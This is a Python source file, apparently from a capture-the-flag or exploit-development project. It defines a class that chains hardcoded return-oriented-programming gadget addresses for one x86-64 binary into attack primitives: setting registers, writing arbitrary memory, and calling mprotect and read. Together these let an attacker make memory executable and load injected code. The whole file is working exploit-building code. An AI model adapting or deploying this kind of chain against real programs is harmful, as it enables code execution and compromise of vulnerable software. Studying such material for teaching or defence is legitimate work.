#!/usr/bin/env python3

from exploiterTemplate import exploiterTemplate
from json.tool import main
from exploiter import exploiter

ea_data = 0x00000000006C1060
#exp = exploiter()

derefer_rax_rax = 0x000000000048fcf0 # mov rax, qword ptr [rax] ; add rsp, 8 ; ret
push_rcx        = 0x0000000000406F03 
pop_rax         = 0x000000000044db34
pop_rsp         = 0x0000000000463C64 # pop rsp ; ret
pop_rbp         = 0x0000000000419E7F # pop rbp ; ret
main_addr       = 0x0000000000401383 # push rbp ; mov rbp, rsp
mprotect_addr   = 0x0000000000435690 
read_addr       = 0x0000000000434B20
exit_addr       = 0x0000000000434180
nop_gadet       = 0x0000000000408B87

class metaGadetGenerator:
    def __init__(self, exp : exploiterTemplate) -> None:
        self.exp = exp

    def ret2_exit(self, exit_code):
        self.rdi_equ(exit_code)

        self.exp.add_gadet(exit_addr)

    def ret2_read(self, fd, buf, count):
        self.rdi_equ(fd)
        self.rsi_equ(buf)
        self.rdx_equ(count)

        self.exp.add_gadet(read_addr)

    def ret2_mprotect(self, addr, _len, prot):
        self.rdi_equ(addr)
        self.rsi_equ(_len)
        self.rdx_equ(prot)

        self.exp.add_gadet(mprotect_addr)

    def rbp_equ(self, val):
        self.exp.add_gadet(pop_rbp) # pop rbp ; ret
        self.exp.add_gadet(val)

    def goto_main(self):
        self.exp.add_gadet(main_addr)

    def rsp_equ(self, val):
        self.exp.add_gadet(pop_rsp) # pop rsp ; ret
        self.exp.add_gadet(val)

    def add_rax_3(self):
        self.exp.add_gadet(0x0000000000463ba0)

    def add_rax_2(self):
        self.exp.add_gadet(0x0000000000463b87)

    def add_rax_8(self):
        self.add_rax_3()
        self.add_rax_3()
        self.add_rax_2()


    def mov_rcx_rax(self, pre):
        self.ex_write_what_where(rsi_where=pre.TEMP1)
        self.rdi_equ(pre.TEMP1)
        self.rdx_equ(pre.TRASH1)
        self.exp.add_gadet(0x000000000040F170) # mov rcx, qword ptr [rdi] ; mov qword ptr [rdx], rcx ; ret

    # Side-Effect: Changes rbx
    def mov_rsi_rax(self, pre):
        self.mov_rcx_rax(pre)
        
        # Save rax
        self.ex_write_what_where(rsi_where=pre.TEMP1)
        self.rax_equ(256)
        
        # Set eflags to 0
        self.sub_rax_1()

        # Prepare rdx for variable
        self.exp.add_gadet(0x000000000040DDF8) # mov rsi, rcx ; jbe ...
        self.exp.add_gadet(0x1122334455667788) # padding for pop rbx
        # movzx eax, byte ptr [rdx] ; pop rbx ; ret

        # finally restore rax
        self.read_toRAX(pre.TEMP1)

    def marker(self):
        self.exp.add_gadet(0x000000000046452F)

    def sub_rax_1(self):
        self.exp.add_gadet(0x0000000000433613)

    def sub_rax_n(self, n):
        for x in range(n):
            self.sub_rax_1()

    def ex_write_what_where(self, rax_what=None, rsi_where=None):
        if rsi_where is not None:
            self.rsi_equ(rsi_where)

        if rax_what is not None:
            self.rax_equ(rax_what)

        self.exp.add_gadet(0x0000000000470f11) # mov qword ptr [rsi], rax ; ret

    def rdi_equ(self, val):
        self.exp.add_gadet(0x0000000000401b73)
        self.exp.add_gadet(val)

    def rdx_equ(self, val):
        self.exp.add_gadet(0x0000000000437A85)
        self.exp.add_gadet(val)

    def rax_equ(self, val):
        self.exp.add_gadet(0x000000000044db34) # pop rax ; ret
        self.exp.add_gadet(val)


    def rsi_equ(self, val):
        self.exp.add_gadet(0x0000000000401c87) # pop rsi ; ret
        self.exp.add_gadet(val)


    def qword_convert(self, ea_start, position):
        return ea_start + position * 8


    def write_what_where(self, ea, value):
        self.rsi_equ(ea)             
        self.rax_equ(value)

        self.exp.add_gadet(0x0000000000470f11)


    def write_what_where_RAX(self, ea):
        self.rsi_equ(ea)             

        self.exp.add_gadet(0x0000000000470f11)


    def add_eax_to_ebx(self):
        self.exp.add_gadet(0x0000000000474f21) # add ebx, eax ; nop dword ptr [rax + rax] ; xor eax, eax ; ret

    def exchange_eax_ebx(self):
        self.exp.add_gadet(0x0000000000459339) # xchg eax, ebx ; ret


    def follow_rax_rax(self):
        global derefer_rax_rax
        
        self.exp.add_gadet(derefer_rax_rax)
        # Add padding for add rsp
        self.exp.add_gadet(0x0000000000000000)


    def read_toRAX(self, ea):
        global derefer_rax_rax

        self.rax_equ(ea)
        self.exp.add_gadet(derefer_rax_rax)
        # Add padding for add rsp
        self.exp.add_gadet(0x0000000000000000)


    def finalize(self):        
        self.exp.finish()
